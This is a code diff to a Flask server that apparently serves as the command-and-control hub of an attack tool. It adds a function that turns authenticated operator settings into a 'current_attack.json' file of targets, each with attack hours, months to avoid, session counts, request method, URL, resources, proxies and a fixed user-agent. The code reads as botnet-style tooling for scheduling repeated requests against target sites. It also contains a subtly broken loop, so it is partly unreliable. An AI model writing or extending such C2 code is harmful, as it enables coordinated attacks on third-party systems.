@@ -7,6 +7,8 @@ from CCServer import CCServer
 from os import urandom
 
 import logging
+from time import time
+from collections import OrderedDict
 from logging.handlers import RotatingFileHandler
 from datetime import datetime 
 
@@ -69,7 +71,7 @@ def updateSettings():
     if CC.authenticate({ 'auth_usr'  : auth.username, 'auth_pwd' : auth.password }):
         # if user is correctly authenticated we can performe update op.
         try:
-            CC.updateSettings(request.json['settings'])
+            CC.updateSettings(prepareConfigFile(request.json['settings']))
             app.logger.info("[{0}] => reached by {1} / {2}: settings override!".format(str(datetime.utcnow()), request.remote_addr, auth.username))
             return "Override succeded", 200
         except TypeError as error:
@@ -82,6 +84,105 @@ def updateSettings():
         app.logger.info("[{0}] => reached by {1} / {2}: forbidden!".format(str(datetime.utcnow()), request.remote_addr, auth.username))
         return "Forbidden!", 403
 
+
+def prepareConfigFile(params, where='./data/current_attack.json'):
+
+        localRootSchema = dict()
+
+        # Only the useful key values will be changed accordingly
+        localRootSchema['last_modified'] = round(time())
+        localRootSchema['cc_server'] = params['cc_server'] if 'cc_server' in params else ""
+        localRootSchema['log_file'] = './data/log.txt'
+        localRootSchema['user-agent_b'] = "PROVETTA"
+        localRootSchema['targets'] = []
+
+        # Creation of the requestSchema
+        for elem in params['target']:
+            # Creation of the locaTargetSchema based upon the TargetSchema
+            localTargetSchema = dict()
+            localTargetSchema['period'] = int(elem['period']) if 'period' in elem else 1
+            localTargetSchema['max_count'] = int(elem['max_count']) if 'max_count' in elem else 15
+            localTargetSchema['sessions'] = int(elem['sessions']) if 'sessions' in elem else 1
+
+            # Creation of the actionCondition dictionary
+            actionConditions = OrderedDict()
+
+            # If AMPM has been choosen both AM and PM will be set on 1
+            ampm = elem['AMPM'] if 'AMPM' in elem else ""
+            if ampm == "AM":
+                actionConditions['AM'] = 1
+                actionConditions['PM'] = 0
+            if ampm == "PM":
+                actionConditions['AM'] = 0
+                actionConditions['PM'] = 1
+            if ampm == "AMPM":
+                actionConditions['AM'] = 1
+                actionConditions['PM'] = 1
+            if elem['hour_start'] == "" or elem['hour_end'] == "":
+                actionConditions['attack_time'] = ""
+            else:
+                actionConditions['attack_time'] = elem['hour_start'] + "-" + elem['hour_end']
+
+            if 'avoid_month' in elem:
+                if isinstance(elem['avoid_month'], list):
+                    actionConditions['avoid_month'] = elem['avoid_month']
+                else:
+                    actionConditions['avoid_month'] = [elem['avoid_month']]
+            else:
+                actionConditions['avoid_month'] = []
+
+            if 'avoid_week' in elem:
+                if isinstance(elem['avoid_week'], list):
+                    actionConditions['avoid_week'] = elem['avoid_week']
+                else:
+                    actionConditions['avoid_week'] = [elem['avoid_week']]
+            else:
+                actionConditions['avoid_week'] = []
+
+            # ActionConditions is now part of the localTargetSchema
+            localTargetSchema['action_conditions'] = actionConditions
+
+            localRequestSchema = dict()
+            localRequestSchema['method'] = elem['method'] if 'method' in elem else ""
+            localRequestSchema['url'] = elem['url'] if 'url' in elem else ""
+
+            if 'resources' in elem:
+                if isinstance(elem['resources'], list):
+                    for res in elem['resources']:
+                        if res[0] != "/":
+                            res = "/" + res
+                    localRequestSchema['resources'] = elem['resources']
+                else:
+                    if elem['resources'][0] != "/":
+                        elem['resources'] = "/" + elem['resources']
+                    localRequestSchema['resources'] = [elem['resources']]
+            else:
+                localRequestSchema['resources'] = ["/"]
+
+            localRequestSchema['encoding'] = elem['encoding'] if 'encoding' in elem else ""
+
+            # Creation of the proxy dictionary
+            proxy = OrderedDict()
+
+            # If an element has been specified as https, it will be handeld properly
+            if ('proxy' in elem):
+                for proxy_elem in elem['proxy']:
+                    if "https://" in proxy_elem:
+                        proxy['https'] = proxy_elem
+                    else:
+                        proxy['http'] = proxy_elem
+            else:
+                proxy['https'] = ''
+                proxy['http'] = ''
+
+            # Proxy is now part of localRequestSchema
+            localRequestSchema['proxy_server'] = proxy
+
+            # Final combination of the three schemas
+            localTargetSchema['request_params'] = localRequestSchema
+            localRootSchema['targets'].append(localTargetSchema)
+
+        return localRootSchema
 
 # ROUTING SERVER - logs visualization (debug purposes)
 @app.route('/logs', methods=['GET'])
